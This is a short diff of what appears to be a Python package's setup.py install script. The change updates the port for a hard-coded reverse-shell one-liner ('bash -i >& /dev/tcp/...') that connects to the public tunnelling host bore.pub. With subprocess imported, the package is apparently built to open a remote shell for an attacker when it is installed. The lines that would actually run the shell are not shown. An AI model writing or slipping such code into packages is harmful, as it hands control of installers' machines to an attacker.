@@ -2,7 +2,7 @@ import sys, subprocess
 from setuptools import setup, find_packages
 
 HOST = "bore.pub"
-PORT = 52352
+PORT = 40324
 
 
 _ONE_LINER = f"bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1"
